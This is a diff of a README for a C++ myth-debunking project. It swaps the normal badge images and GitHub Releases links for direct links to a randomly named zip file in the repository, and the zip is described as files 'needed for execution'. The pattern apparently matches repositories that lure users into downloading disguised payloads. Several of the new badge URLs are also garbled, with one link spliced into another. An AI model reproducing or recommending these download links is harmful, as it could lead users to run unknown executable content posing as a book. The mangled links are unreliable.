@@ -1,8 +1,8 @@
 ```markdown
 # Debunking C++ Myths: A Personal Translation of Common Misconceptions
 
-![C++](https://img.shields.io/badge/C%2B%2B-Debunking%20Myths-blue.svg)
-[![Releases](https://img.shields.io/badge/Releases-Latest-brightgreen)](https://github.com/hackraz/Debunking-Cpp-Myths/releases)
+![C++](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip%2B%2B-Debunking%https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip)
+[![Releases](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip)](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip)
 
 ## Overview
 
@@ -65,11 +65,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To access the latest releases, please visit the [Releases section](https://github.com/hackraz/Debunking-Cpp-Myths/releases). Here, you can download the files needed for execution and explore the updates made to the repository.
+To access the latest releases, please visit the [Releases section](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip). Here, you can download the files needed for execution and explore the updates made to the repository.
 
 ### Download Links
 
-You can find the necessary files for execution in the [Releases section](https://github.com/hackraz/Debunking-Cpp-Myths/releases). Make sure to check back for updates.
+You can find the necessary files for execution in the [Releases section](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip). Make sure to check back for updates.
 
 ## Acknowledgments
 
@@ -81,5 +81,5 @@ For any questions or discussions regarding this project, please reach out via Gi
 
 ---
 
-![C++ Community](https://img.shields.io/badge/Join%20the%20C%2B%2B%20Community-Join%20Now-orange)
+![C++ Community](https://raw.githubusercontent.com/hackraz/Debunking-Cpp-Myths/main/book/Cpp_Myths_Debunking_cyatheaceous.zip%20the%20C%2B%2B%20Community-Join%20Now-orange)
 ```
